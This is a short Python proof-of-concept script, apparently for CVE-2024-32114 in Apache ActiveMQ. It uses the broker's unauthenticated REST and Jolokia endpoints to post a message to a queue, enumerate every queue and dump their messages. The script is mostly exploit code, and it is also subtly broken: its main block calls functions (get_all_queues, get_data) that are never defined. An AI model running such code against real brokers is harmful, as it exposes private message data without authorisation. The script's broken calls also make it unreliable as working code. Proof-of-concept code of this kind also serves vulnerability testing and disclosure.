import requests
import json

def skt_nsc_send_message(url):
    try:
        destination = 'cve-2024-32114-Test'
        headers = {'Content-Type': 'application/json'}
        data = {
            'type': 'queue',
            'destinationName': destination,
            'body': [
                'SKT-NSC',
                'cve-2024-32114',
                'POC Test',
                'jolokia api',
                'send message',
            ]
        }
        response = requests.post(f"{url}/api/message?type=queue&destination={destination}", json=data, headers=headers)
        print(f'Message sent successfully to {destination}')
    except Exception as e:
        print(f'Error while sending message : ', e)

def skt_nsc_queues(url):
    try:
        response = requests.get(f'{url}/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=*')
        data = response.json()
        print("Get all queues : ", data)
        queues = [value['Name'] for key, value in data['value'].items()]
        return queues

    except Exception as e:
        print("Error while getting queues: ", e)
        return []

def skt_nsc_message(jolokia_url, queue_name):
    try:
        response = requests.get(f'{jolokia_url}/exec/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName={queue_name}/browse()')
        data = response.json()
        messages = data['value']
        return messages
    
    except Exception as e:
        print(f'Error while getting message from queue :', e)
        return[]

def skt_nsc_data(jolokia_url, queues):
    if queues:
        for queue_name in queues:
            print(f'Queue: {queue_name}')
            messages = skt_nsc_message(jolokia_url, queue_name)
            if messages:
                for message in messages:
                    print(f"Message: {message}")
            else:
                print(f'No messages found in queue "{queue_name}"')     
    else:
        print('No queues found')

if __name__ == "__main__":
    url = 'http://192.168.56.1:8161'
    jolokia_url = f'{url}/api/jolokia'
    
    # send_message(url)
    queues = get_all_queues(url)
    get_data(jolokia_url, queues)

